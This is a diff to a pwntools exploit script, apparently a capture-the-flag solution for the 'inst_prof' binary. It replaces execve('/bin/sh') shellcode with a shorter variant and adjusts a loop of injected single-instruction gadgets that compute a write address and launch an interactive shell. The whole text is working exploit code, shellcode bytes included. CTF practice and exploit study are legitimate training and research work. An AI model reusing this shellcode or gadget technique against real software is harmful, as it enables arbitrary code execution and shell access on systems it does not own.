@@ -4,7 +4,7 @@ from pwn import *
 from IPython import embed
 
 context(arch='amd64', os='linux')
-context.log_level = 'debug'
+#context.log_level = 'debug'
 
 ret = asm('ret')                            # "\xc3"
 
@@ -21,13 +21,11 @@ p = process("./inst_prof")
 
 print(p.readline())
 
-shellcode = (   
-    "\x48\x31\xc0\x48\x89\xec\x50\x48"
-    "\x89\xe2\x48\xbb\xff\x2f\x62\x69"
-    "\x6e\x2f\x73\x68\x48\xc1\xeb\x08"
-    "\x53\x48\x89\xe7\x50\x52\x48\x89"
-    "\xe2\x50\x57\x48\x89\xe6\xb0\x3b"
-    "\x0f\x05"
+shellcode = (
+    "\xb0\x3b\x99\x48\xbb\x2f"
+    "\x62\x69\x6e\x2f\x2f\x73"
+    "\x68\x52\x53\x54\x5f\x52"
+    "\x57\x54\x5e\x0f\x05"
 )
 
 # We store the return address r13
@@ -52,7 +50,7 @@ p.send(asm('add r13, r14') + ret)           # "\x4d\x01\xf5"; r13 = [rsp] + 0x20
 p.send(asm('mov r14, r13') + ret)           # "\x4d\x89\xee"; r14 = r14; r14 Counter
 
 inst = asm('inc r14') + ret                 # "\x49\xff\xc6"
-for i in range(0x70):
+for i in range(0x80):
     p.send(inst)
 
 p.send(asm('mov r15, r14') + ret)           # "\x4d\x89\xf7"; r14 = r15 = 0x*******70
@@ -62,5 +60,4 @@ writeByteString(shellcode)
 # r14 -> Addr Shellcode
 # r15 -> Addr End Shellcode
 
-embed()	
 p.interactive()
